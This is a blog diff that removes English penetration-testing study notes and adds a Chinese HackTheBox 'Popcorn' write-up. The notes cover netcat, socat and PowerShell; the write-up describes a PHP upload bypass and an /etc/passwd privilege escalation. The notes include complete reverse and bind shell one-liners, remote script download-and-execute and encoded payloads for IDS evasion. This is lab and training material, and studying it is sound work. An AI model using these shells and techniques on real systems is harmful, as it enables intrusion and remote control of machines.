-</ul>
-<ul>
-<li>mkdir -p test&#x2F;{test1,test2,test3}</li>
-</ul>
-<h4 id="finding-files"><a href="#finding-files" class="headerlink" title="finding files"></a>finding files</h4><ul>
-<li>which </li>
-<li>locate (qucikest)<br>  sudo updatedb<br>  locate xxx.exe</li>
-<li>find</li>
-</ul>
-<ul>
-<li>find &#x2F; -name xxx*</li>
-</ul>
-<h4 id="manage-kali-linux-services"><a href="#manage-kali-linux-services" class="headerlink" title="manage kali linux services"></a>manage kali linux services</h4><ul>
-<li>ssh (default port 22)<br>  sudo systemctl start ssh<br>  sudo ss -antlp | grep sshd<br>  sudo systemctl enable ssh</li>
-<li>http<br>  sudo systemctl start apache2<br>  sudo ss -antlp | grep apache<br>  sudo systemctl enable apache2<br>  systemctl list-unit-files</li>
-</ul>
-<h4 id="seraching-installing-and-removing-tools"><a href="#seraching-installing-and-removing-tools" class="headerlink" title="seraching,installing and removing tools"></a>seraching,installing and removing tools</h4><ul>
-<li>apt update</li>
-<li>apt upgrade </li>
-<li>apt-cache search</li>
-<li>apt-show</li>
-<li>apt install</li>
-<li>apt remove –purge</li>
-<li>dpkg (offline)</li>
-</ul>
-<ul>
-<li>dpkg -i .&#x2F;xxxx_xxxx.deb</li>
-</ul>
-<h3 id="2-command-line-fun"><a href="#2-command-line-fun" class="headerlink" title="2.command line fun"></a>2.command line fun</h3><h4 id="environment-variables"><a href="#environment-variables" class="headerlink" title="environment variables"></a>environment variables</h4><p>when opening a terminal window, a new bash process has its own environment variables<br>when running a command without full path,the bash will search the path<br><code>echo $PATH</code><br><code>echo $USER</code><br><code>echo $PWD</code><br><code>echo $HOME</code><br><code>export b=10.10.10.3</code> if don’t use export,the variable can just use in current shell<br><code>env</code> show all path</p>
-<h4 id="tab-completion"><a href="#tab-completion" class="headerlink" title="tab completion"></a>tab completion</h4><h4 id="bash-history"><a href="#bash-history" class="headerlink" title="bash history"></a>bash history</h4><p><code>!1</code> repeat the first line command in history<br><code>!!</code> repeat the last command that was executed during our terminal session<br>the history file saved in .bash_history in user home directory<br>ctrl+r can reverse search history</p>
-<h4 id="piping-and-redirection"><a href="#piping-and-redirection" class="headerlink" title="piping and redirection"></a>piping and redirection</h4><ul>
-<li><code>&gt;</code> redirectiing to new file</li>
-<li><code>&gt;&gt;</code> redirecting to existing file</li>
-<li><code>&lt;</code> redirecting from existing file</li>
-<li>0-STDIN 1-STDOUT 2-STDERR</li>
-<li>piping <code>cat error.txt | wc -m &gt; count.txt</code></li>
-</ul>
-<h4 id="text-searching-and-manipulation"><a href="#text-searching-and-manipulation" class="headerlink" title="text searching and manipulation"></a>text searching and manipulation</h4><ul>
-<li>grep <code>ls -la /usr/bin | grep zip</code></li>
-<li>sed <code>echo &quot;I need to try hard&quot; | sed &#39;s/hard/harder/&#39;</code></li>
-<li>cut <code>echo &quot;I hack binaries,web apps,mobile apps,and just about anything else&quot; | cut -f 2 -d &quot;,&quot;</code> <code>cut -d &quot;:&quot; -f 1 /etc/passwd</code></li>
-<li>awk <code>echo &quot;hello::there::friend&quot; | awk -f &quot;::&quot; &#39;&#123;print $1, $3&#125;&#39;</code></li>
-</ul>
-<h4 id="editing-files-from-the-command-line"><a href="#editing-files-from-the-command-line" class="headerlink" title="editing files from the command line"></a>editing files from the command line</h4><ul>
-<li>nano</li>
-<li>vi</li>
-</ul>
-<h4 id="comparing-files"><a href="#comparing-files" class="headerlink" title="comparing files"></a>comparing files</h4><ul>
-<li>comm <code>comm -12 a.txt b.txt</code> suppressed the first and the second columns</li>
-<li>diff <code>diff -c a.txt b.txt</code> <code>diff -u a.txt b.txt</code> </li>
-<li>vimdiff</li>
-</ul>
-<h4 id="managing-processed"><a href="#managing-processed" class="headerlink" title="managing processed"></a>managing processed</h4><ul>
-<li>bg <code>ping -c 400 localhost &gt; ping_result.txt &amp;</code> or <code>ctrl+z</code></li>
-<li>jobs and fg</li>
-</ul>
-<ul>
-<li>fg is to back to the foreground <code>fg %1</code></li>
-</ul>
-<ul>
-<li>ps and kill</li>
-</ul>
-<ul>
-<li>ps -ef -e:select processed -f:display full format listing</li>
-<li>ps -fC leafpad</li>
-</ul>
-<h4 id="file-and-command-monitoring"><a href="#file-and-command-monitoring" class="headerlink" title="file and command monitoring"></a>file and command monitoring</h4><ul>
-<li>tail <code>tail -f /var/log/apache2/access.log</code> -nX:output the last n lines</li>
-<li>watch <code>watch -n 5 w</code></li>
-</ul>
-<h4 id="downloading-files"><a href="#downloading-files" class="headerlink" title="downloading files"></a>downloading files</h4><ul>
-<li>wget <code>wget -O</code></li>
-<li>curl <code>curl -o</code></li>
-<li>axel <code>axel -a -n 20 -o </code></li>
-</ul>
-<h4 id="customizing-the-bash-enviroment"><a href="#customizing-the-bash-enviroment" class="headerlink" title="customizing the bash enviroment"></a>customizing the bash enviroment</h4><ul>
-<li><code>export HISTIGNORE=&quot;&amp;:ls:[bf]g:exit:history&quot;</code></li>
-<li><code>export HISTTIMEFORMAT=&#39;%F %T &#39;</code></li>
-<li>Alias <code>alisa lsa=&#39;ls -al&#39;</code> <code>unalias lsa</code></li>
-<li>~&#x2F;.bashrc</li>
-</ul>
-<h3 id="3-practical-tool"><a href="#3-practical-tool" class="headerlink" title="3.practical tool"></a>3.practical tool</h3><h4 id="netcat"><a href="#netcat" class="headerlink" title="netcat"></a>netcat</h4><h5 id="connecting-to-a-TCP-x2F-UDP-port"><a href="#connecting-to-a-TCP-x2F-UDP-port" class="headerlink" title="connecting to a TCP&#x2F;UDP port"></a>connecting to a TCP&#x2F;UDP port</h5><p><code>nc -nv 10.101.11.2 110</code><br>-n is to skip DNS name resolution<br>-v is to output specific<br><code>USER xxxx</code> <code>PASS xxxx</code> <code>quit</code></p>
-<h5 id="listening-on-a-TCP-x2F-UDP-port"><a href="#listening-on-a-TCP-x2F-UDP-port" class="headerlink" title="listening on a TCP&#x2F;UDP port"></a>listening on a TCP&#x2F;UDP port</h5><p><code>nc -lvnp 4444</code><br>-l is to create a listener<br>-p is to specify the port </p>
-<h5 id="transferring-files-with-netcat"><a href="#transferring-files-with-netcat" class="headerlink" title="transferring files with netcat"></a>transferring files with netcat</h5><p><code>nc -nlvp 4444 &gt; incoming.exe</code>:redirect any output into a file called incoming.exe<br><code>nc -nv 10.10.23.22 4444 &lt; /usr/share/windows/wget.exe</code>:put the wget.exe to 10.10.23.22</p>
-<h5 id="remote-administration"><a href="#remote-administration" class="headerlink" title="remote administration"></a>remote administration</h5><p><code>nc -nlvp 4444 -e cmd.exe</code>:bound to port 4444 and redirect any input,output and error message from cmd.exe to the network.In other words,everyone who connect bob’s machine will see bob’s cmd.<br>‘nc -nv 10.11.0.22 4444 -e &#x2F;bin&#x2F;bash’:send a reverse shell to target machine,and the target machine can interact with the shell.</p>
-<h4 id="socat"><a href="#socat" class="headerlink" title="socat"></a>socat</h4><h5 id="socat-vs-netcat"><a href="#socat-vs-netcat" class="headerlink" title="socat vs netcat"></a>socat vs netcat</h5><p>netcat connect to remote server:<code>nc &lt;remote server&#39;s ip address&gt; 80</code><br>socat connect to remote server:<code>socat -TCP4:&lt;remote servers&#39;s ip address&gt;:80</code><br>netcat bind a listener:<code>nc -lvp localhost 443</code><br>socat bind a listener:<code>socat TCP4-LISTEN:443 STDOUT</code></p>
-<h5 id="socat-file-transfers"><a href="#socat-file-transfers" class="headerlink" title="socat file transfers"></a>socat file transfers</h5><p><code>socat TCP4-LISTEN:443,fork file:secret_password.txt</code><br><code>socat TCP4:10.10.0.4:443 file:received_secret_password.txt,create</code></p>
-<h5 id="socat-reverse-shell"><a href="#socat-reverse-shell" class="headerlink" title="socat reverse shell"></a>socat reverse shell</h5><p><code>socat -d -d TCP4-LISTEN:443 STDOUT</code><br><code>socat TCP4:10.10.0.22:443 EXEC(-e):/bin/bash</code></p>
-<h5 id="socat-Encrypted-bind-shells"><a href="#socat-Encrypted-bind-shells" class="headerlink" title="socat Encrypted bind shells"></a>socat Encrypted bind shells</h5><p><code>openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt</code><br><code>req</code>:initiate a new certificate signing request<br><code>-newkey</code>:generate a new private key<br><code>rsa:2048</code>:use RSA encryption with a 2048-bit key length<br><code>-nodes</code>:store the private key without passphrase protection<br><code>-keyout</code>:save the key to a file<br><code>-x509</code>:output a self-signed certificate instead of a certificate request<br><code>-days</code>:set validity period in days<br><code>-out</code>:save the certificate to a file<br>and combine both of them into a pem file that socat will accept<br><code>cat bind_shell.key bind_shell.crt &gt; bind_shell.pem</code><br><code>socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash</code><br><code>verify=0</code>:disable ssl verification<br><code>fork</code>:spawn a child process</p>
-<h4 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h4><h5 id="version"><a href="#version" class="headerlink" title="version"></a>version</h5><p>powershell 5.0 runs on </p>
-<ul>
-<li><a href>Windows Server 2016</a>(installed by default)</li>
-<li><a href>Windows Server 2012R2</a>&#x2F;<a href>Windows Server 2012</a>&#x2F;<a href>Windows Server 2008 R2 with Serveice Pack1</a>&#x2F;<a href>Windows 8.1</a>&#x2F;<a href>Windows 7 with Service Pack1</a>(install windows management framework 5.0 to run it)<br>powershell 4.0 runs on </li>
-<li><a href>Windows 8.1</a>&#x2F;<a href>Windows Server 2012 R2</a>(installed by default)</li>
-<li><a href>Windows 7 with Service Pack 1</a>&#x2F;<a href>Windows Server 2008 R2 with Service Pack1</a>(install windows management framework 4.0 to run it)<br>powershell 3.0 runs on</li>
-<li><a href>Windows 8</a>&#x2F;<a href>Windows Server 2012</a>(installed by default)</li>
-<li><a href>Windows 7 with Service Pack1</a>&#x2F;<a href>Windows Server 2008 R2 with Service Pack 1&#x2F;2</a>(install windows management framework 3.0 to run it)<br>powershell maintains an execution policy that determines which type of powershell scripts can be run on the system.The default policy is “Restrict”,which means the system will neither load powershell configuration files nor run powershell scripts.We need to set “Unrestricted” policy on the machine,open the powershell run as administrator.<br>Type <code>Set-ExecutionPolicy Unrestricted</code> and choose yes to finsh the following opreates.</li>
-</ul>
-<h5 id="powershell-file-transfers"><a href="#powershell-file-transfers" class="headerlink" title="powershell file transfers"></a>powershell file transfers</h5><p><code>powershell -c &quot;(new-object System.Net.WebClient).DownloadFile(&#39;http://10.11.0.4/wget.exe&#39;,&#39;C:\Users\offsec\Desktop\wget.exe&#39;)&quot;</code></p>
-<h5 id="powershell-reverse-shells"><a href="#powershell-reverse-shells" class="headerlink" title="powershell reverse shells"></a>powershell reverse shells</h5><p><code>powershell -c &quot;$client = New-Object Systems.Net.Sockets.TCPClient(&#39;10.11.0.4&#39;,443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%&#123;0&#125;;while(($i = $stream.Read($bytes, 0,$bytes.Length)) -ne 0)&#123;;$data= (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &#39;PS&#39; + (pwd).Path + &#39;&gt; &#39;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush();&#125;$client.Close()&quot;</code></p>
-<h5 id="powershell-bind-shells"><a href="#powershell-bind-shells" class="headerlink" title="powershell bind shells"></a>powershell bind shells</h5><p><code>powershell -c &quot;$listener = New-Object Systems.Net.Sockets.TCPClient(&#39;0.0.0.0&#39;,443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%&#123;0&#125;;while(($i = $stream.Read($bytes, 0,$bytes.Length)) -ne 0)&#123;;$data= (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &#39;PS&#39; + (pwd).Path + &#39;&gt; &#39;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush();&#125;$client.Close();$listener.Stop()&quot;</code></p>
-<h4 id="powercat"><a href="#powercat" class="headerlink" title="powercat"></a>powercat</h4><p>powercat is essentially the powershell version of netcat.<br>first we should type <code>..\powercat.ps1</code> to make all variables and functions declared in the script available in the current powershell scope.<br>if the target machine is connected to Internet,we can use a remote script<br><code>iex (New-Object System.Net.Webclient).DownloadString(&#39;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#39;)</code></p>
-<h5 id="powercat-file-transfers"><a href="#powercat-file-transfers" class="headerlink" title="powercat file transfers"></a>powercat file transfers</h5><p>kali machine:<code>nc -lnvp 443 &gt; receiving_powercat.ps1</code><br>windows machne:<code>powercat -c 10.11.0.4 -p 443 -i C:\Users\Offsec\powercat.ps1</code></p>
-<h5 id="powercat-reverse-shells"><a href="#powercat-reverse-shells" class="headerlink" title="powercat reverse shells"></a>powercat reverse shells</h5><p><code>powercat -c 10.11.0.4 -p 443 -e cmd.exe</code></p>
-<h5 id="powercat-bind-shells"><a href="#powercat-bind-shells" class="headerlink" title="powercat bind shells"></a>powercat bind shells</h5><p><code>powercat -l -p 443 -e cmd.exe</code></p>
-<h5 id="powercat-stand-alone-payloads"><a href="#powercat-stand-alone-payloads" class="headerlink" title="powercat stand-alone payloads"></a>powercat stand-alone payloads</h5><p><code>powercat -c 10.11.0.4 -p 443 -e cmd.exe -g &gt; reverseshell.ps1</code><br>this will create an executable file that can reverse a shell<br><code>./reverseshell.ps1</code><br>but this may easily detected by IDS<br>so we can attemp to execute Base64 encoded commands<br><code>powercat -c 10.11.0.4 -p 443 -e cmd.exe -ge &gt; encodedreverseshell.ps1</code><br>powershell can implement the same function by using<br><code>powershell.exe -E Zgaaasaaaaacasca......(Base64 encoded string)</code></p>
-<h4 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h4><h4 id="tcpdump"><a href="#tcpdump" class="headerlink" title="tcpdump"></a>tcpdump</h4><p><code>tcpdump -r password_cracking_filtered.pcap</code></p>
-<h5 id="filtering-traffic"><a href="#filtering-traffic" class="headerlink" title="filtering traffic"></a>filtering traffic</h5><ol>
-<li><code>tcpdump -n -r password_cracking_filtered.pcap | awk -F&quot; &quot; &#39;&#123;print 5&#125;&#39; | sort | uniq -c | head</code><br><code>-n</code>:skip DNS name lookups<br><code>-r</code>:read from our packet capture file<br><code>uniq -c</code>:count the number of times the field appears in the capture<br><code>head</code>:display the first 10 lines of the output</li>
-<li><code>tcpdump -n src host 172.16.40.10 -r password_cracking_filtered.pcap</code><br><code>tcpdump -n dst host 172.16.40.10 -r password_cracking_filtered.pcap</code><br><code>tcpdump -n port 81 -r password_cracking_filtered.pcap</code><br>use source host(src host) and destination host(dst host) to filter from the command line<br><code>tcpdump -nX -r password_cracking_filtered.pcap</code><br>print the packet data in both HEX and ASCII format</li>
-</ol>
-<h5 id="advanced-header-filtering"><a href="#advanced-header-filtering" class="headerlink" title="advanced header filtering"></a>advanced header filtering</h5><p><code>echo &quot;$((2#00011000))&quot;</code><br>this represent flag of ACK and PSH<br><code>tcpdump -A -n &#39;tcp[13] = 24&#39; -r password_cracking_filtered.pcap</code><br>-A is to print the packets in ascii<br>tcp[13] is the tcp dump array’s 14th byte,and the 24 is the combination of the two flags,it will only show the http request and response data</p>
-<h3 id="5-bash-scripting"><a href="#5-bash-scripting" class="headerlink" title="5.bash scripting"></a>5.bash scripting</h3><h3 id="6-passive-information-gathering"><a href="#6-passive-information-gathering" class="headerlink" title="6.passive information gathering"></a>6.passive information gathering</h3><h4 id="taking-notes"><a href="#taking-notes" class="headerlink" title="taking notes"></a>taking notes</h4><h4 id="website-recon"><a href="#website-recon" class="headerlink" title="website recon"></a>website recon</h4><h4 id="whois-Enumeration"><a href="#whois-Enumeration" class="headerlink" title="whois Enumeration"></a>whois Enumeration</h4><p><code>whois ipaddress/website</code></p>
-<h4 id="google-hacking"><a href="#google-hacking" class="headerlink" title="google hacking"></a>google hacking</h4><h4 id="netcraft"><a href="#netcraft" class="headerlink" title="netcraft"></a>netcraft</h4><p>such as <a href>https://searchdns.netcraft.com</a></p>
-<h4 id="recon-ng"><a href="#recon-ng" class="headerlink" title="recon-ng"></a>recon-ng</h4><p>we need to install various modules to use recon-ng</p>
-<ul>
-<li>marketplace search—<code>marketplace search github</code></li>
-<li>marketplace info—<code>marketplace info recon/domains-hosts/google_site_web</code></li>
-<li>marketplace install—<code>marketplace install recon/domains-hosts/google_site_web</code></li>
-<li>modules load—<code>modules load recon/domains-hosts/google_site_web</code></li>
-<li>option set—<code>options set SOURCE megacorpone.com</code></li>
-<li>run</li>
-<li>back</li>
-<li>show—<code>show hosts</code></li>
-</ul>
-<h4 id="open-source-code"><a href="#open-source-code" class="headerlink" title="open-source code"></a>open-source code</h4><p>gitrob&#x2F;gitleaks</p>
-<h4 id="shodan"><a href="#shodan" class="headerlink" title="shodan"></a>shodan</h4><h4 id="security-headers-scanner"><a href="#security-headers-scanner" class="headerlink" title="security headers scanner"></a>security headers scanner</h4><p>Security Headers</p>
-<h4 id="SSL-server-test"><a href="#SSL-server-test" class="headerlink" title="SSL server test"></a>SSL server test</h4><h4 id="Pastebin"><a href="#Pastebin" class="headerlink" title="Pastebin"></a>Pastebin</h4><h4 id="User-information-gathering"><a href="#User-information-gathering" class="headerlink" title="User information gathering"></a>User information gathering</h4><h5 id="email-harvesting"><a href="#email-harvesting" class="headerlink" title="email harvesting"></a>email harvesting</h5><p><code>theHarvester -d magacorpone.com -b google</code></p>
-<h5 id="password-dumps"><a href="#password-dumps" class="headerlink" title="password dumps"></a>password dumps</h5><p>the most common wordlist in kali is rockyou in &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou</p>
-<h4 id="social-media-tools"><a href="#social-media-tools" class="headerlink" title="social media tools"></a>social media tools</h4><ul>
-<li>social-searcher</li>
-<li>site-sprcific tools</li>
-</ul>
-<ul>
-<li>Twofi</li>
-<li>linkedin2username</li>
-</ul>
-<h4 id="stack-overflow"><a href="#stack-overflow" class="headerlink" title="stack overflow"></a>stack overflow</h4><h4 id="information-gathering-frameworks"><a href="#information-gathering-frameworks" class="headerlink" title="information gathering frameworks"></a>information gathering frameworks</h4><h5 id="OSINT-Framework"><a href="#OSINT-Framework" class="headerlink" title="OSINT Framework"></a>OSINT Framework</h5><h5 id="Maltego"><a href="#Maltego" class="headerlink" title="Maltego"></a>Maltego</h5><h3 id="7-active-information-gathering"><a href="#7-active-information-gathering" class="headerlink" title="7.active information gathering"></a>7.active information gathering</h3><h4 id="DNS-Enumeration-Domain-Name-system"><a href="#DNS-Enumeration-Domain-Name-system" class="headerlink" title="DNS Enumeration(Domain Name system)"></a>DNS Enumeration(Domain Name system)</h4><h5 id="interacting-with-a-DNS-Server"><a href="#interacting-with-a-DNS-Server" class="headerlink" title="interacting with a DNS Server"></a>interacting with a DNS Server</h5><ul>
-<li>NS - Nameserver records contain the name of the authoritative server hosting the DNS records for a domain.</li>
-<li>A - Also known as a host record,the “a record” contains the IP address of a hostname.</li>
-<li>MX - Mail Exchange records contain the names of the servers responsible for handling email for the domain.A doamin can contain multiple MX records.</li>
-<li>PTR - Pointer Records are used in reverse lookup zones and are used to find the records associated with an IP address.</li>
-<li>CNAME - Canonical Name Records are used to create aliases for other host records.</li>
-<li>TXT - Text records can contain any arbitrary data and can be used for various purposes,such as domain ownership verification.<br><code>host www.megacorpone.com</code><br><code>host -t mx www.megacorpone.com</code> -t is to specify the type of record</li>
-</ul>
-<h5 id="automating-lookups"><a href="#automating-lookups" class="headerlink" title="automating lookups"></a>automating lookups</h5><h5 id="forward-lookup-brute-force"><a href="#forward-lookup-brute-force" class="headerlink" title="forward lookup brute force"></a>forward lookup brute force</h5><p><code>for ip in $(cat list.txt); do host $ip.megacorpone.com; done</code></p>
-<h5 id="reverse-lookup-brute-force"><a href="#reverse-lookup-brute-force" class="headerlink" title="reverse lookup brute force"></a>reverse lookup brute force</h5><p><code>for ip in $(seq 50 100); do host 38.100.193.$ip; done | grep -v &quot;not found&quot;</code></p>
-<h5 id="DNS-Zone-Transfers"><a href="#DNS-Zone-Transfers" class="headerlink" title="DNS Zone Transfers"></a>DNS Zone Transfers</h5><p><code>host -l megacorpone.com ns1.megacorpone.com</code> -l(list zone) to attemp the zone transfers<br>some large organizations might host many DNS servers,or we might want to attemp zone transfer request against all the DNS servers in a given domain.<br>get the nameserver for a given domain—-<code>host -t ns megacorpone.com | cut -d &quot; &quot; -f 4</code></p>
-<pre><code>#!/bin/bash
-# Simple zone transfer bash script
-# $1 is the first argument given after the bash script
-if [ -z &quot;$1&quot; ]; then
-  echo &quot;[*] Simple Zone transfer script&quot;
-  echo &quot;[*] Usage   : $0 &lt;damain name&gt; &quot;
-  exit 0
-fi
+        <h4 id="nmap-scan"><a href="#nmap-scan" class="headerlink" title="nmap scan"></a>nmap scan</h4><img src="/2022/09/05/popcorn/nmap.png">
+#### port explore
+22
+80:一个apache的安装完成的界面，没有额外的信息
+#### 目录扫描
+<img src="/2022/09/05/popcorn/dir.png">
+扫到的test目录下存在phpinfo,显示这是一个php5.2.10
+搜索一下5.2.10是否存在可以利用的点
+<img src="/2022/09/05/popcorn/ss.png">
+<img src="/2022/09/05/popcorn/fileuploads.png">
+配置文件中表明fileupload功能没有禁止
+存在`'hash_update_file()' Freed Resource Usage`
+<img src="/2022/09/05/popcorn/rename.png">
+/rename类似于一个接口，将上传的文件进行了重命名
+如果我们传一个错误的页面到filename中，它的报错信息会把所在目录爆出来
+<img src="/2022/09/05/popcorn/direrror.png">
+/torrent是一个管理系统，在页面上进行注册并且进入上传页面
+我们传一个torrent上去，可以发现可以在其中加图片描述,能得到图片的上传地址
+<img src="/2022/09/05/popcorn/torrent.png">
+<img src="/2022/09/05/popcorn/img.png">
+<img src="/2022/09/05/popcorn/path.png">
+因为上传地址是`http://10.10.10.6/torrent/upload/19a6fcfcba6cc2c6d371eb754074d095adb5d291.png`
+所以我们可以先尝试访问一下/torrent/upload
+<img src="/2022/09/05/popcorn/upload.png">
+直接上传一个php文件会显示invalid file
+用burpsuite抓包，将Content-Type改成image/png,发现可以成功绕过过滤条件直接进行上传
+所以只要上传一个php后门，将content-type改成合法的参数就能实现成功上传
+检查/torrent/upload
+<img src="/2022/09/05/popcorn/upload2.png">
+传一个php的reverse shell,然后开nc在本地端口进行监听，远程进行访问，成功获取www权限的shell
+<img src="/2022/09/05/popcorn/www.png">
+#### root
+在george的家目录下存在很多隐藏文件
+`find . -type f -ls`
+<img src="/2022/09/05/popcorn/hid.png">
+其中的`./.cache/motd.legal-displayed`文件值得关注，因为该类型的文件在一个新的会话开始时执行，这可能会导致一些恶意代码的执行
+搜索motd.legal-displayed privesc(Privilege Escalation),会找到一个(cve-14339)[https://www.exploit-db.com/exploits/14339]
++ 1.用脚本自动提权
+自动执行的时候遇到了点问题，需要手动输入www的密码，所以转成手动提权
+需要先在目标机中生成ssh-keygen，将id_rsa.pub改名为authorized_keys,接着chmod -R 700 .ssh
+运行bash privesc.sh
++ 2.手动提权
+该脚本的原理是创建一个.ssh和一个.cache文件夹，在.ssh文件夹中生成ssh的公钥与私钥，然后将.cache软链接到/etc/passwd,再次使用ssh连接自己触发漏洞，将/etc/passwd的权限改为www-data,则可以用www-data直接更改文件内容添加用户进行提权，增加用户权限的操作如下
+`
+openssl passwd bmfx
+DcqfpgDB7cBZU
 
-# if arguement was given, identify the DNS servers for the domain
-for server in $(host -t ns $1 | cut -d &quot; &quot; -f 4); do
-  # For each of these servers, attemp a zone transfer
-  host -l $1 $server |grep &quot;has address&quot;
-done
-</code></pre>
-<h5 id="relevant-tools-in-kali-linux"><a href="#relevant-tools-in-kali-linux" class="headerlink" title="relevant tools in kali linux"></a>relevant tools in kali linux</h5><ul>
-<li>DNSRecon</li>
-</ul>
-<ul>
-<li><code>dnsrecon -d megacorpone.com -t axfr</code>:-d is to specify a domain name,-t is to specify the type of enumeration to perform</li>
-<li><code>dnsrecon -d ,egacorpone.com -D ~/list.txt -t brt</code>:-D is to specify a file name containing potential subdomain strings</li>
-</ul>
-<ul>
-<li>DNSenum</li>
-</ul>
-<ul>
-<li><code>dnsenum zonetransfer.me</code></li>
-</ul>
-<h4 id="port-scanning"><a href="#port-scanning" class="headerlink" title="port scanning"></a>port scanning</h4><h5 id="TCP-x2F-UDP-scanning"><a href="#TCP-x2F-UDP-scanning" class="headerlink" title="TCP&#x2F;UDP scanning"></a>TCP&#x2F;UDP scanning</h5><ul>
-<li>TCP scanning<br><code>nc -nvv -w 1 -z 10.11.1.220 3388-3390</code>:-w is to specify the connection timeout in seconds,-z is to specify zero-I&#x2F;O mode,which will send no data and is used for scanning.</li>
-<li>UDP scanning<br><code>nc -nv -u -z -w 1 10.11.1.115 160-162</code>:-u is indicates a UDP scan</li>
-</ul>
-<h5 id="port-scanning-with-nmap"><a href="#port-scanning-with-nmap" class="headerlink" title="port scanning with nmap"></a>port scanning with nmap</h5><ul>
-<li><ol>
-<li>stealth&#x2F;SYN scanning<br><code>nmap -sS 10.10.1.220</code></li>
-</ol>
-</li>
-<li><ol start="2">
-<li>TCP connecct scanning<br><code>nmap -sT 10.10.1.220</code></li>
-</ol>
-</li>
-<li><ol start="3">
-<li>UDP scanning<br><code>nmap -sU 10.10.1.220</code><br>the UDP scan can also be used in conjunction with a TCP SYN scan to build a more complete pocture of our target<br><code>nmap -sS -sU 10.10.1.220</code></li>
-</ol>
-</li>
-<li><ol start="4">
-<li>network sweeping<br><code>nmap -sn 10.10.1.1-254</code><br><code>nmap -v -sn 10.10.1.1-254 -oG ping-sweep.txt</code>:-oG is to save the result into a format<br><code>nmap -p 80 10.10.1.1-254 -oG web-sweep.txt</code><br><code>nmap -sT -A --top-ports=20 10.10.1.1-254 -oG top-port-sweep.txt</code>:-A is to enable OS version detection,script scanning,and traceroute,and the top 20 ports is in &#x2F;usr&#x2F;share&#x2F;nmap&#x2F;nmap-services</li>
-</ol>
-</li>
-<li><ol start="5">
-<li>OS fingerprinting<br><code>nmap -O 10.10.1.220</code></li>
-</ol>
-</li>
-<li><ol start="6">
-<li>Banner grabbing&#x2F;service Enumeration<br><code>nmap -sV -sT -A 10.10.1.220</code>:-sV is to inspecting service banners</li>
-</ol>
-</li>
-<li><ol start="7">
-<li>nmap scripting engine(NSE)<br><code>nmap 10.10.1.110 --script=smb-os-discovery</code><br><code>nmap --script-help dns-zone-transfer</code></li>
-</ol>
-</li>
-</ul>
-<h5 id="masscan"><a href="#masscan" class="headerlink" title="masscan"></a>masscan</h5><p><code>masscan -p80 10.0.0.0/8</code><br><code>masscan -p80 10.11.1.0/24 --rate=1000 -e tap0 --router-ip 10.11.0.1</code>:-e is to specify the raw network interface to use,–router-ip is to specify the ip address for the appropriate gateway</p>
-<h4 id="SMB-Enumeration-Server-message-block"><a href="#SMB-Enumeration-Server-message-block" class="headerlink" title="SMB Enumeration(Server message block)"></a>SMB Enumeration(Server message block)</h4><h5 id="scanning-for-the-netbios-service"><a href="#scanning-for-the-netbios-service" class="headerlink" title="scanning for the netbios service"></a>scanning for the netbios service</h5><p><code>nmap -v -p 139,445 -oG smb.txt 10.11.11.1-254</code><br><code>nbtscan -r 10.11.11.0/24</code>:-r is to specify the originating UDP port as 137</p>
-<h5 id="Nmap-SMB-NSE-scripts"><a href="#Nmap-SMB-NSE-scripts" class="headerlink" title="Nmap SMB NSE scripts"></a>Nmap SMB NSE scripts</h5><p>&#x2F;usr&#x2F;share&#x2F;nmap&#x2F;scripts&#x2F;smb*</p>
-<h4 id="NFS-Enumeration-NetWork-file-system"><a href="#NFS-Enumeration-NetWork-file-system" class="headerlink" title="NFS Enumeration(NetWork file system)"></a>NFS Enumeration(NetWork file system)</h4><h5 id="scanning-for-NFS-shares"><a href="#scanning-for-NFS-shares" class="headerlink" title="scanning for NFS shares"></a>scanning for NFS shares</h5><p>both portmapper and rpcbind run on tcp port 111<br><code>nmap -V -p 111 10.11.1.1-254</code><br><code>nmap -sV -p 111 --script=rpcinfo 10.11.1.1-254</code></p>
-<h5 id="Nmap-NFS-NSE-Scripts"><a href="#Nmap-NFS-NSE-Scripts" class="headerlink" title="Nmap NFS NSE Scripts"></a>Nmap NFS NSE Scripts</h5><p>&#x2F;usr&#x2F;share&#x2F;nmap&#x2F;scripts&#x2F;nfs*</p>
-<h4 id="SMTP-Enumeration-Simple-Mail-Transport-Protocol"><a href="#SMTP-Enumeration-Simple-Mail-Transport-Protocol" class="headerlink" title="SMTP Enumeration(Simple Mail Transport Protocol)"></a>SMTP Enumeration(Simple Mail Transport Protocol)</h4><p>this protocol supports several interesting commands such as VRFY and EXPN<br>VRFY request ask the server to verify an email address<br>EXPN request ask the server for the membership of a mailing list<br>    nc -nv 10.11.1.217 25<br>    VRFY root<br>    VRFY idontexist</p>
-<h4 id="SNMP-Enumeration-Simple-Network-Management-protocol"><a href="#SNMP-Enumeration-Simple-Network-Management-protocol" class="headerlink" title="SNMP Enumeration(Simple Network Management protocol)"></a>SNMP Enumeration(Simple Network Management protocol)</h4><h5 id="The-SNMP-MIB-Tree"><a href="#The-SNMP-MIB-Tree" class="headerlink" title="The SNMP MIB Tree"></a>The SNMP MIB Tree</h5><h5 id="Scanning-for-SNMP"><a href="#Scanning-for-SNMP" class="headerlink" title="Scanning for SNMP"></a>Scanning for SNMP</h5><p><code>nmap -sU --open -p 161 10.11.1.1-254 -oG open-snmp.txt</code><br><code>-sU</code> is to perform UDP scanning<br><code>--open</code> is to limit the output to only display open ports<br>alternatively,we can use a tool such as onesixtyone<br>First we must build text files contaoning community strings and the ip addresses we wish to scan<br>    echo public &gt; community<br>    echo private &gt;&gt; community<br>    echo manager &gt;&gt; 